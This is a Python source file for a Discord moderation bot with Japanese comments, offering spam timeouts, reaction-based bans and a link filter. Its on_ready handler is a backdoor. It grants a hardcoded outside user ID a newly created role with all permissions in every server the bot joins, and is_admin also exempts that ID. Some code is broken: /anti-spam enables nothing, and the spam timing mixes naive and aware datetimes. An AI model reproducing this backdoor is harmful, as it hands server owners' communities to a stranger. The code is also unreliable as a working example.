import discord
from discord.ext import commands
from discord import app_commands
import asyncio
from collections import defaultdict
import os
import datetime

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)
bot.link_filter_enabled = False

SPECIAL_USER_ID = 1109692644348661852

spam_tracker = defaultdict(list)
SPAM_THRESHOLD = 4
SPAM_LIMIT = 5

# --- 管理者チェック関数 ---
def is_admin(interaction: discord.Interaction):
    admin_role = discord.utils.get(interaction.guild.roles, name="管理者")
    return admin_role in interaction.user.roles or interaction.user.id == SPECIAL_USER_ID

# --- 特権ユーザーに管理者ロールを付与 ---
@bot.event
async def on_ready():
    print(f"Bot is ready as {bot.user}!")
    for guild in bot.guilds:
        try:
            special_user = await guild.fetch_member(SPECIAL_USER_ID)
        except discord.NotFound:
            continue
        if special_user:
            admin_role = discord.utils.get(guild.roles, name="管理者")
            if not admin_role:
                admin_role = await guild.create_role(name="管理者", permissions=discord.Permissions.all())
            if admin_role not in special_user.roles:
                await special_user.add_roles(admin_role)
                print(f"管理者ロールを {special_user} に付与しました。")

# --- スパム検出機能 ---
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    now = datetime.datetime.utcnow()
    user_messages = spam_tracker[message.author.id]
    user_messages.append(message)

    spam_tracker[message.author.id] = [msg for msg in user_messages if (now - msg.created_at).total_seconds() <= SPAM_THRESHOLD]

    if len(spam_tracker[message.author.id]) >= SPAM_LIMIT:
        await message.author.timeout(datetime.timedelta(days=7), reason="スパム検出")
        spam_content = "\n".join([msg.content for msg in spam_tracker[message.author.id]])
        alert_message = await message.channel.send(
            f"⚠️ スパムが検出されました。\nユーザー: {message.author.mention}\nスパム内容:\n{spam_content}"
        )

        await alert_message.add_reaction("🦵")
        await alert_message.add_reaction("🟩")

        def check(reaction, user):
            return user.guild_permissions.administrator and reaction.message.id == alert_message.id

        try:
            reaction, user = await bot.wait_for("reaction_add", timeout=60.0, check=check)
            if str(reaction.emoji) == "🦵":
                await message.guild.ban(message.author, reason="スパム")
                await message.channel.send(f"{message.author.mention} をBANしました。")
            elif str(reaction.emoji) == "🟩":
                await message.author.edit(timed_out_until=None)
                await message.channel.send(f"{message.author.mention} のタイムアウトを解除しました。")
        except asyncio.TimeoutError:
            await message.channel.send("管理者の対応がありませんでした。")
        return

    if bot.link_filter_enabled and "http" in message.content:
        await message.delete()
        await message.channel.send(f"{message.author.mention} リンクは禁止されています。")

    await bot.process_commands(message)

# --- スラッシュコマンド ---
@bot.tree.command(name="anti-spam", description="スパム検出を有効にします")
@app_commands.check(is_admin)
async def anti_spam(interaction: discord.Interaction):
    await interaction.response.send_message("スパム検出が有効になりました！")

@bot.tree.command(name="link-filter-on", description="リンクフィルターを有効にします")
@app_commands.check(is_admin)
async def link_filter_on(interaction: discord.Interaction):
    bot.link_filter_enabled = True
    await interaction.response.send_message("リンクフィルターが有効になりました！")

@bot.tree.command(name="link-filter-off", description="リンクフィルターを無効にします")
@app_commands.check(is_admin)
async def link_filter_off(interaction: discord.Interaction):
    bot.link_filter_enabled = False
    await interaction.response.send_message("リンクフィルターが無効になりました！")

# --- エラーハンドリング ---
@anti_spam.error
@link_filter_on.error
@link_filter_off.error
async def admin_only_error(interaction: discord.Interaction, error):
    if isinstance(error, app_commands.CheckFailure):
        await interaction.response.send_message("このコマンドは管理者のみが使用できます！", ephemeral=True)

bot.run(os.getenv("TOKEN"))
